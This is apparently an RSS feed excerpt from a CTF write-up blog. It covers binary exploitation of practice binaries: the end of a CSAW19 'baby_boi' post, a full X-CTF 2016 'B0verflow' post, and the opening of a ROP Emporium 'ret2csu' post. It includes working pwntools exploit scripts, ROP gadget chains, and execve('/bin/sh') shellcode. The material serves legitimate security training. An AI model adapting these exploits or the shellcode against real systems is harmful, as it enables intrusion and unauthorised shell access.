&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616166&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">40&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, let&amp;rsquo;s do some investigation within GDB. Using the &lt;code>info proc map&lt;/code> command we can see the start address where &lt;code>libc&lt;/code> is loaded, we&amp;rsquo;ll use this to calculate the offset of &lt;code>printf&lt;/code> from the start of &lt;code>libc&lt;/code>.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info proc map
process 1332
Mapped address spaces:
Start Addr End Addr Size Offset objfile
0x400000 0x401000 0x1000 0x0 ./baby_boi
0x600000 0x601000 0x1000 0x0 ./baby_boi
0x601000 0x602000 0x1000 0x1000 ./baby_boi
0x7ffff7def000 0x7ffff7e14000 0x25000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&amp;gt; p printf
$1 = {int (const char *, ...)} 0x7ffff7e45cf0 &amp;lt;__printf&amp;gt;
pwndbg&amp;gt; p/x 0x7ffff7e45cf0 - 0x7ffff7def000
$4 = 0x56cf0
&lt;/code>&lt;/pre>&lt;p>We can use a wonderful tool called &lt;code>one_gadget&lt;/code> to get an address in our &lt;code>libc&lt;/code> that will automatically give us a shell if we return to it (provided that the right conditions are met).&lt;/p>
&lt;pre>&lt;code>$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so 130 ⨯
0xcbd1a execve(&amp;quot;/bin/sh&amp;quot;, r12, r13)
constraints:
[r12] == NULL || r12 == NULL
[r13] == NULL || r13 == NULL
0xcbd1d execve(&amp;quot;/bin/sh&amp;quot;, r12, rdx)
constraints:
[r12] == NULL || r12 == NULL
[rdx] == NULL || rdx == NULL
0xcbd20 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
constraints:
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;p>We&amp;rsquo;ll use that first gadget, located at &lt;code>0xcbd1a&lt;/code> in combination with our leaked &lt;code>libc&lt;/code> address to get a shell.&lt;/p>
&lt;p>Using &lt;code>ropper&lt;/code> we can find a gadget that will allow us to setup the correct conditions for our magic gadget.&lt;/p>
&lt;pre>&lt;code>ropper --file ./baby_boi --search 'pop r12'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12
[INFO] File: ./baby_boi
0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/code>&lt;/pre>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now it&amp;rsquo;s time to develop our exploit. Here&amp;rsquo;s an outline of the main steps we want to take:&lt;/p>
&lt;ul>
&lt;li>Capture the leaked &lt;code>printf&lt;/code> address.&lt;/li>
&lt;li>Calculate the start address of &lt;code>libc&lt;/code> using the leak and the offset of &lt;code>printf&lt;/code> we calculated earlier.&lt;/li>
&lt;li>Overwrite the return address with the address of our setup gadget.&lt;/li>
&lt;li>Return to &lt;code>libc&lt;/code> and our magic gadget to get a shell.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
setup &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x40078c&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0xcbd1a execve(&amp;#34;/bin/sh&amp;#34;, r12, r13)
&lt;/span>&lt;span style="color:#e6db74">constraints:
&lt;/span>&lt;span style="color:#e6db74"> [r12] == NULL || r12 == NULL
&lt;/span>&lt;span style="color:#e6db74"> [r13] == NULL || r13 == NULL
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
magic &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0cbd1a&lt;/span>
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./baby_boi&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
rop&lt;span style="color:#f92672">.&lt;/span>raw(setup)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./baby_boi&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;Here I am: &amp;#39;&lt;/span>)
libc &lt;span style="color:#f92672">=&lt;/span> eval(r&lt;span style="color:#f92672">.&lt;/span>readline()[:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x56cf0&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(libc &lt;span style="color:#f92672">+&lt;/span> magic)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s the exploit in action.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[*] './baby_boi'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[*] Loaded 14 cached gadgets for './baby_boi'
[+] Starting local process './baby_boi': pid 2253
[*] Switching to interactive mode
$ cat flag.txt
csaw19{babyboi}
$
[*] Stopped process './baby_boi' (pid 2253)
&lt;/code>&lt;/pre></content></item><item><title>X-CTF 2016 :: B0verflow</title><link>https://anvbis.github.io/posts/xctf-2016-b0verflow/</link><pubDate>Fri, 13 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/xctf-2016-b0verflow/</guid><description>Reverse Engineering Let&amp;rsquo;s begin by using the file command to get a little insight into this executable. Note that it is a 32-bit linux binary.
$ file ./b0verflow ./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped We can also use checksec to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Let&amp;rsquo;s begin by using the &lt;code>file&lt;/code> command to get a little insight into this executable. Note that it is a 32-bit linux binary.&lt;/p>
&lt;pre>&lt;code>$ file ./b0verflow
./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
&lt;/code>&lt;/pre>&lt;p>We can also use &lt;code>checksec&lt;/code> to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.&lt;/p>
&lt;pre>&lt;code>$ checksec ./b0verflow
[*] './b0verflow'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX disabled
PIE: No PIE (0x8048000)
RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;p>Running the binary reveals that it at some point prompts us for user input. This is likely where we&amp;rsquo;ll find a vulnerability (perhaps it reads to much data in).&lt;/p>
&lt;pre>&lt;code>$ ./b0verflow
======================
Welcome to X-CTF 2016!
======================
What's your name?
anvbis
Hello anvbis
.
&lt;/code>&lt;/pre>&lt;p>Disassembling the &lt;code>main&lt;/code> function reveals that it calls a function &lt;code>vul&lt;/code>. We&amp;rsquo;ll want to investigate this function next, I get the feeling it&amp;rsquo;s vulnerable.&lt;/p>
&lt;pre>&lt;code>int main (int argc, char **argv, char **envp);
0x0804850e push ebp
0x0804850f mov ebp, esp
0x08048511 and esp, 0xfffffff0
0x08048514 call vul ; sym.vul
0x08048519 leave
0x0804851a ret
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>vul&lt;/code> function shows that it reads in 0x32 bytes from stdin, and stores them at a pointer &lt;code>*s&lt;/code>. However, we can see that no memory (beyond the size of the pointer itself) is allocated on the stack at this address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined4 &lt;span style="color:#a6e22e">vul&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s;
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">======================&amp;#34;&lt;/span>);
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Welcome to X-CTF 2016!&amp;#34;&lt;/span>);
puts(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">======================&amp;#34;&lt;/span>);
puts(&lt;span style="color:#e6db74">&amp;#34;What&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">s your name?&amp;#34;&lt;/span>);
fflush(_reloc.stdout);
fgets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>s, &lt;span style="color:#ae81ff">0x32&lt;/span>, _reloc.stdin);
printf(&lt;span style="color:#e6db74">&amp;#34;Hello %s.&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>s);
fflush(_reloc.stdout);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We&amp;rsquo;ve found our stack buffer overflow.&lt;/p>
&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Next, let&amp;rsquo;s find where the return address is relative to our input buffer. Note that the &lt;code>vul&lt;/code> function doesn&amp;rsquo;t read many bytes in (only 0x32) so hopefully this is enough to reach the return address.&lt;/p>
&lt;p>Here&amp;rsquo;s a simple script that attaches the process to GDB and sends a cyclic pattern of 100 bytes that we can use to determine the return address' offset.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./b0verflow&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">100&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can continue in GDB and watch the process crash when it tries to return to our garbage data. See the top of the stack below, it seems we can only write about 9 bytes past the return address, this will complicate our exploit.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/4x $esp
0xff93cf20: 0x6161616b 0x6161616c 0x0000006d 0xf7de4e46
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s print out the value of &lt;code>$eip&lt;/code> and use pwntools' &lt;code>cyclic_find&lt;/code> function to find the offset. It appears that &lt;code>$eip&lt;/code> is 36 bytes after the start of our input buffer.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; p $eip
$1 = (void (*)()) 0x6161616a
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616a&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">36&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So, now we need to solve the limited space issue (9 bytes is not enough space to store a complex ROP chain). Let&amp;rsquo;s use the &lt;code>ropper&lt;/code> tool to see if we can find any gadgets to pivot our stack.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./b0verflow --stack-pivot
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
Gadgets
=======
0x08048609: add esp, 0x1c; pop ebx; pop esi; pop edi; pop ebp; ret;
0x0804837e: add esp, 8; pop ebx; ret;
0x0804847e: ret 0xeac1;
0x08048500: sub esp, 0x24; ret;
4 gadgets found
&lt;/code>&lt;/pre>&lt;p>The gadget that I immediately noticed was &lt;code>sub esp, 0x24; ret&lt;/code>, this will allow us to move the stack almost all the way to the start of our input buffer (about 4 bytes into our input buffer, to be exact).&lt;/p>
&lt;pre>&lt;code>0x08048500: sub esp, 0x24; ret;
&lt;/code>&lt;/pre>&lt;p>Now we just need something like a &lt;code>jmp esp&lt;/code> or a &lt;code>mov eax, esp; jmp eax&lt;/code> gadget to direct process execution to our shellcode. Using &lt;code>ropper&lt;/code> again, we immediately find a &lt;code>jmp esp&lt;/code> instruction.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./b0verflow --search 'jmp esp' 130 ⨯
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp esp
[INFO] File: ./b0verflow
0x08048504: jmp esp;
&lt;/code>&lt;/pre>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have all the information we need, we can start developing our exploit.&lt;/p>
&lt;p>Let&amp;rsquo;s write some shellcode. We only have a limited amount of space to store it (about 32 bytes), so I&amp;rsquo;ve used various techniques (such as using &lt;code>xor&lt;/code> to set registers to &lt;code>0&lt;/code>) to reduce the size of the shellcode.&lt;/p>
&lt;pre>&lt;code>.global _start
_start:
.intel_syntax noprefix
shell:
push 0x0068732f # &amp;quot;/sh&amp;quot;
push 0x6e69622f # &amp;quot;/bin&amp;quot;
mov ebx, esp # &amp;quot;/bin/sh&amp;quot;
xor ecx, ecx
xor edx, edx
mov al, 11
int 0x80 # execve(&amp;quot;/bin/sh&amp;quot;)
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
&lt;/code>&lt;/pre>&lt;p>After compilation, we can see that our shellcode is only 20 bytes long, very nice.&lt;/p>
&lt;pre>&lt;code>08049000 &amp;lt;_start&amp;gt;:
8049000: 68 2f 73 68 00 push $0x68732f
8049005: 68 2f 62 69 6e push $0x6e69622f
804900a: 89 e3 mov %esp,%ebx
804900c: 31 c9 xor %ecx,%ecx
804900e: 31 d2 xor %edx,%edx
8049010: b0 0b mov $0xb,%al
8049012: cd 80 int $0x80
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">1&lt;/span>]: open(&lt;span style="color:#e6db74">&amp;#39;payload&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
Out[&lt;span style="color:#ae81ff">1&lt;/span>]: &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xc9&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
In [&lt;span style="color:#ae81ff">2&lt;/span>]: len(open(&lt;span style="color:#e6db74">&amp;#39;payload&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read())
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">20&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can write our final exploit. Note that we need to add the address to the &lt;code>jmp esp&lt;/code> gadget 4 bytes after the start of our input buffer (as this is where the program will attempt to get the next return address after our stack pivot).&lt;/p>
&lt;p>Here&amp;rsquo;s an overview of what we want to achieve:&lt;/p>
&lt;ul>
&lt;li>Pivot our stack with the &lt;code>sub esp, 0x24; ret&lt;/code> gadget.&lt;/li>
&lt;li>Jump to &lt;code>$esp&lt;/code>, where our shellcode is stored.&lt;/li>
&lt;li>Get shellcode execution.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x08048504: jmp esp;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
jmp_esp &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0x08048504&lt;/span>)
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x08048500: sub esp, 0x24; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
sub_esp &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0x08048500&lt;/span>)
buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xc9&lt;/span>&lt;span style="color:#e6db74">1&lt;/span>&lt;span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
lpad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
rpad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#ae81ff">36&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(buf) &lt;span style="color:#f92672">-&lt;/span> len(jmp_esp) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./b0verflow&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(lpad &lt;span style="color:#f92672">+&lt;/span> jmp_esp &lt;span style="color:#f92672">+&lt;/span> buf &lt;span style="color:#f92672">+&lt;/span> rpad &lt;span style="color:#f92672">+&lt;/span> sub_esp)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './b0verflow': pid 2328
[*] Switching to interactive mode
$ cat flag.txt
X-CTF{b0verflow}
$
[*] Stopped process './b0verflow' (pid 2328)
&lt;/code>&lt;/pre></content></item><item><title>ROP Emporium :: Ret2csu</title><link>https://anvbis.github.io/posts/rop-emporium-ret2csu/</link><pubDate>Thu, 12 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/rop-emporium-ret2csu/</guid><description>Reverse Engineering Let&amp;rsquo;s run the file command to get a brief overview of the binary. Note that it is a 64-bit linux executable.
$ file ./ret2csu ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped We can also run checksec against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Let&amp;rsquo;s run the &lt;code>file&lt;/code> command to get a brief overview of the binary. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ file ./ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
&lt;/code>&lt;/pre>&lt;p>We can also run &lt;code>checksec&lt;/code> against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection. We can also see that the NX bit is enabled, so we can&amp;rsquo;t execute shellcode.&lt;/p>
&lt;pre>&lt;code>$ checksec ./ret2csu
[*] './ret2csu'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
RUNPATH: b'.'
&lt;/code>&lt;/pre>&lt;p>Running the executable shows us that it at some point takes user input. This is likely where we&amp;rsquo;ll be able to find some vulnerability.&lt;/p>
&lt;pre>&lt;code>$ ./ret2csu
ret2csu by ROP Emporium
x86_64
Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.
&amp;gt; hello
Thank you!
&lt;/code>&lt;/pre>&lt;p>After a tiny bit of reverse engineering, we see this &lt;code>pwnme&lt;/code> function called by &lt;code>main&lt;/code>. We can see that it allocates 0x20 bytes of memory for a buffer &lt;code>buf&lt;/code>, before reading in 0x200 bytes from stdin and storing it in the buffer - here is our overflow.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">pwnme&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf;
setvbuf(&lt;span style="color:#f92672">*&lt;/span>_reloc.stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xc88&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xca0&lt;/span>);
memset(&lt;span style="color:#f92672">&amp;amp;&lt;/span>buf, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x20&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xca8&lt;/span>);
printf(&lt;span style="color:#ae81ff">0xd12&lt;/span>);
read(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buf, &lt;span style="color:#ae81ff">0x200&lt;/span>);
puts(&lt;span style="color:#ae81ff">0xd15&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Further investigation reveals that there is a function called &lt;code>ret2win&lt;/code>. Another function &lt;code>usefulFunction&lt;/code> appears to call &lt;code>ret2win&lt;/code> with the parameters &lt;code>ret2win(0x3, 0x2, 0x1)&lt;/code>. We&amp;rsquo;ll want to investigate this function further.&lt;/p>
&lt;pre>&lt;code>0x00400510 1 6 sym.imp.ret2win
&lt;/code>&lt;/pre>&lt;pre>&lt;code>0x000000000040061b &amp;lt;+4&amp;gt;: mov edx,0x3
0x0000000000400620 &amp;lt;+9&amp;gt;: mov esi,0x2
0x0000000000400625 &amp;lt;+14&amp;gt;: mov edi,0x1
0x000000000040062a &amp;lt;+19&amp;gt;: call 0x400510 &amp;lt;ret2win@plt&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>ret2win&lt;/code> function reveals that it will immediately call &lt;code>exit&lt;/code> if the correct parameters are not provided. If the correct parameters are provided, however, the binary will decrypt and print the flag stored in &lt;code>encrypted_flag.dat&lt;/code>.&lt;/p>
&lt;p>The correct parameters are as follows:&lt;/p>
&lt;ul>
&lt;li>&lt;code>$rdi = 0xdeadbeefdeadbeef&lt;/code>.&lt;/li>
&lt;li>&lt;code>$rsi = 0xcafebabecafebabe&lt;/code>.&lt;/li>
&lt;li>&lt;code>$rdx = 0xd00df00dd00df00d&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>So we have to find some way to set all of these registers to their correct values before calling the &lt;code>ret2win&lt;/code> function in order to get the flag.&lt;/p>
&lt;pre>&lt;code> 0x000009ef 48b8efbeadde. movabs rax, 0xdeadbeefdeadbeef
0x000009f9 483945e8 cmp qword [var_18h], rax
┌─&amp;lt; 0x000009fd 0f85d7000000 jne 0xada
│ 0x00000a03 48b8bebafeca. movabs rax, 0xcafebabecafebabe
│ 0x00000a0d 483945e0 cmp qword [var_20h], rax
┌──&amp;lt; 0x00000a11 0f85c3000000 jne 0xada
││ 0x00000a17 48b80df00dd0. movabs rax, 0xd00df00dd00df00d
││ 0x00000a21 483945d8 cmp qword [var_28h], rax
┌───&amp;lt; 0x00000a25 0f85af000000 jne 0xada
│││ 0x00000a2b 488d35ee0200. lea rsi, [0x00000d20]
│││ 0x00000a32 488d3de90200. lea rdi, str.encrypted_flag.dat
│││ 0x00000a39 e8f2fdffff call sym.imp.fopen
...
│││
└└└─&amp;gt; 0x00000ada 488d3d930200. lea rdi, str.Incorrect_parameters
0x00000ae1 e8bafcffff call sym.imp.puts ; int puts(const char *s)
0x00000ae6 bf01000000 mov edi, 1 ; int status
0x00000aeb e850fdffff call sym.imp.exit ; void exit(int status)
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>First, let&amp;rsquo;s find the offset of the return address from where our input buffer is stored in the &lt;code>pwnme&lt;/code> function.&lt;/p>
&lt;p>We&amp;rsquo;ll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.&lt;/p>
